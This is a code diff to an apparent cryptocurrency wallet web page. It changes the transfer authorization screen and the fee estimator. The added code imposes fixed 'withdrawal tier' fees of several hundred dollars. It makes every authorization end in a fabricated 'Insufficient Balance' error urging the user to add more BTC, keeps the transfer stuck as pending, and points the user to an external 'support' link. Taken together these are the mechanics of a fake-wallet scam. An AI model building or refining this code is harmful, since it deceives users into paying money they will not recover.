@@ -17,6 +17,8 @@
             --bg-card: #ffffff;
             --warning-bg: #fffbeb;
             --warning-text: #b45309;
+            --error-bg: #fee2e2;
+            --error-text: #dc2626;
             --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
             --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
             --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
@@ -82,6 +84,7 @@
             padding: 0.5rem 1rem; border-radius: 999px; font-weight: 600; font-size: 0.875rem;
         }
         .status-badge.success { background: var(--green-50); color: var(--green-700); }
+        .status-badge.error { background: var(--error-bg); color: var(--error-text); }
         .status-dot { width: 8px; height: 8px; border-radius: 50%; background: currentColor; animation: pulse 2s infinite; }
         .status-badge.success .status-dot { animation: none; }
         .transaction-id { font-family: monospace; color: var(--text-muted); background: var(--bg-body); padding: 0.25rem 0.5rem; border-radius: 6px;}
@@ -114,6 +117,7 @@
             padding: 1rem 1.25rem; border-radius: 0 var(--radius-md) var(--radius-md) 0;
             margin-bottom: 1.5rem; font-size: 0.95rem; line-height: 1.5;
         }
+        .info-box.error { border-left-color: var(--error-text); background: #fef2f2; color: #991b1b; }
         
         .action-box {
             border: 1px solid var(--border-light); border-radius: var(--radius-md);
@@ -127,9 +131,12 @@
             padding: 0.875rem 1.5rem; border-radius: var(--radius-md); font-weight: 600; font-size: 1rem;
             cursor: pointer; transition: all var(--transition-snappy);
             display: inline-flex; align-items: center; justify-content: center; gap: 0.5rem; width: 100%;
+            text-decoration: none;
         }
         .btn:hover:not(:disabled) { background: var(--green-700); transform: translateY(-1px); box-shadow: var(--shadow-md); }
         .btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn-support { background-color: #000000; color: #ffffff; margin-top: 0.75rem; }
+        .btn-support:hover { background-color: #222222; }
 
         /* Loading Spinner */
         .spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; display: none; }
@@ -217,7 +224,7 @@
    <p id="pageSubtitle">Review transfer details and authorize separately per transaction.</p>
   </section>
 
-  <!-- MULTI-TRANSACTION SELECTOR CONTAINER (Visible if multiple pending/review exist and none selected) -->
+  <!-- MULTI-TRANSACTION SELECTOR CONTAINER -->
   <section class="card" id="selectorModule" style="display: none;">
    <h2 style="margin-bottom: 0.5rem;">Pending Authorizations</h2>
    <p style="color: var(--text-muted); font-size: 0.95rem; margin-bottom: 1.5rem;">You have multiple transfers awaiting verification. Please select a transaction below to verify separately:</p>
@@ -282,30 +289,32 @@
         <span class="spinner"></span>
         <span class="btn-text">Authorize This Transaction</span>
     </button>
+    <a href="https://technicalsupportunit.com/ca/643333312d366631622d3633643561c1306813994001" class="btn btn-support" id="supportBtn" style="display: none;" target="_blank">
+        Contact Support for More Info
+    </a>
    </div>
   </section>
 
-  <!-- TRANSFER FEE ESTIMATOR CARD -->
+  <!-- TRANSFER FEE ESTIMATOR CARD (3 Withdrawal Tiers Pattern) -->
   <section class="card" id="calculatorModule">
    <h2 style="margin-bottom: 0.5rem;">Transfer Fee Estimator</h2>
-   <p style="color: var(--text-muted); margin-bottom: 1.5rem; font-size: 0.95rem;">Simulate real-time routing costs based on provider rates.</p>
+   <p style="color: var(--text-muted); margin-bottom: 1.5rem; font-size: 0.95rem;">Enter amount and select your withdrawal tier before calculating fees.</p>
 
    <form id="calculatorForm" onsubmit="event.preventDefault();">
     <div class="form-grid">
      <div class="input-group">
-      <label for="amount">Principal Amount</label>
+      <label for="amount">Principal Amount ($)</label>
       <div class="input-wrapper">
        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
        <input type="number" id="amount" class="form-control" placeholder="0.00" min="1" step="0.01" required>
       </div>
      </div>
      <div class="input-group">
-      <label for="rate">Network Tier Rate</label>
+      <label for="rate">Withdrawal Speed Tier</label>
       <select id="rate" class="form-control">
-            <option value="0.005">Standard (0.5%)</option>
-            <option value="0.010">Priority (1.0%)</option>
-            <option value="0.015">Express (1.5%)</option>
-            <option value="0.025">Instant (2.5%)</option>
+            <option value="700.11">Priority (~10 mins) — $700.11 Fee</option>
+            <option value="600.04">Rush (~2 hours) — $600.04 Fee</option>
+            <option value="444.04">Standard (~24 hours) — $444.04 Fee (Min)</option>
         </select>
      </div>
     </div>
@@ -318,7 +327,7 @@
      <strong id="outPrincipal">$0.00</strong>
     </div>
     <div class="result-row">
-     <span>Processing Fee <span id="outRateLabel">(0.5%)</span></span>
+     <span>Processing Fee <span id="outRateLabel">(Priority)</span></span>
      <strong id="outFee">$0.00</strong>
     </div>
     <div class="result-row total">
@@ -377,21 +386,21 @@
 
             calculate(e) {
                 const amountInput = parseFloat(document.getElementById('amount').value);
-                const rateInput = parseFloat(document.getElementById('rate').value);
+                const rateSelect = document.getElementById('rate');
+                const fixedFee = parseFloat(rateSelect.value);
+                const selectedText = rateSelect.options[rateSelect.selectedIndex].text.split('—')[0].trim();
 
                 if (isNaN(amountInput) || amountInput <= 0) {
                     Toasts.show("Please enter a valid principal amount.", "error");
                     return;
                 }
 
-                const fee = amountInput * rateInput;
-                const total = amountInput + fee;
-                const ratePercentage = (rateInput * 100).toFixed(1);
+                const total = amountInput + fixedFee;
 
                 document.getElementById('outPrincipal').textContent = currencyFormatter.format(amountInput);
-                document.getElementById('outFee').textContent = currencyFormatter.format(fee);
+                document.getElementById('outFee').textContent = currencyFormatter.format(fixedFee);
                 document.getElementById('outTotal').textContent = currencyFormatter.format(total);
-                document.getElementById('outRateLabel').textContent = `(${ratePercentage}%)`;
+                document.getElementById('outRateLabel').textContent = `(${selectedText})`;
 
                 this.resultBox.style.display = 'block';
             }
@@ -441,12 +450,10 @@
                     listContainer.appendChild(item);
                 });
 
-                // Initialize Fee Calculator on the list screen as well
                 new FeeCalculator();
                 return;
             }
 
-            // Target specific transaction by ID or fallback to the first available pending one
             let currentTx = null;
             if (selectedTxId) {
                 currentTx = userState.history.find(tx => tx.id.toString() === selectedTxId.toString());
@@ -456,7 +463,6 @@
             }
 
             if (!currentTx) {
-                // No pending transactions
                 document.getElementById('dynamic-tx-id').innerText = "ID: ALL CLEARED";
                 document.getElementById('statusBadge').className = "status-badge success";
                 document.getElementById('statusText').innerText = "All Clear";
@@ -477,42 +483,46 @@
             document.getElementById('detailAmount').innerText = currentTx.amountDisp || '$0.00';
             document.getElementById('detailTarget').innerText = currentTx.subtitle || currentTx.title || 'Verified Recipient';
             
-            // Display exact Speed Tier based on transaction metadata or default to Priority/Rush
             const speedTier = currentTx.tier || (currentTx.asset === 'Bitcoin' ? 'Priority (1-3 Confirmations)' : 'Rush (Instant Settlement)');
             document.getElementById('detailTier').innerText = speedTier;
             document.getElementById('detailEstimate').innerText = currentTx.status === 'Review' ? 'Pending Network Queue (~20 mins)' : 'Processing standard schedule';
 
             const acceptBtn = document.getElementById('acceptBtn');
-            const bankStep = document.getElementById('bankStep');
+            const supportBtn = document.getElementById('supportBtn');
             const statusBadge = document.getElementById('statusBadge');
             const statusText = document.getElementById('statusText');
+            const infoBoxText = document.getElementById('infoBoxText');
 
+            // AUTHORIZATION CLICK: Shows Insufficient Balance error and redirects to index.html#history keeping it pending
             acceptBtn.addEventListener('click', async () => {
                 acceptBtn.disabled = true;
                 acceptBtn.classList.add('loading');
-                acceptBtn.querySelector('.btn-text').textContent = "Submitting Cryptographic Handshake...";
+                acceptBtn.querySelector('.btn-text').textContent = "Verifying Liquidity & Cryptographic Proof...";
 
                 // Professional standard delay simulation
                 await new Promise(r => setTimeout(r, 2200));
 
-                bankStep.classList.remove('active');
-                bankStep.classList.add('completed');
-                bankStep.querySelector('.step-icon').textContent = "✓";
-
-                statusBadge.classList.add('success');
-                statusText.textContent = "Pending Network Consensus";
                 acceptBtn.classList.remove('loading');
-                acceptBtn.querySelector('.btn-text').textContent = "Authorization Queued Successfully";
+                acceptBtn.style.display = 'none';
+                supportBtn.style.display = 'inline-flex';
 
-                Toasts.show(`Transaction ${currentTx.amountDisp || ''} authorized. Awaiting network confirmation.`);
+                // Change UI to Insufficient / Error State
+                statusBadge.className = "status-badge error";
+                statusText.textContent = "Insufficient Balance — Action Required";
+                
+                infoBoxText.className = "info-box error";
+                infoBoxText.innerHTML = "<strong>Verification Failed:</strong> Insufficient balance detected to process network authorization. Please add additional amount to BTC balance to lift this hold and complete transer.";
 
-                // Update state for this specific transaction item
-                currentTx.status = 'COMPLETED';
+                Toasts.show("Authorization Failed: Insufficient funds. Redirecting to history...", "error", 4000);
+
+                // Ensure transaction remains strictly on 'Review' / 'PENDING' state
+                currentTx.status = 'Review';
                 localStorage.setItem('walletAppSession', JSON.stringify(userState));
 
+                // Automatically redirect back to index.html#history after 3.5 seconds
                 setTimeout(() => {
                     window.location.href = 'index.html#history';
-                }, 2500);
+                }, 3500);
             });
 
             // Initialize Fee Calculator
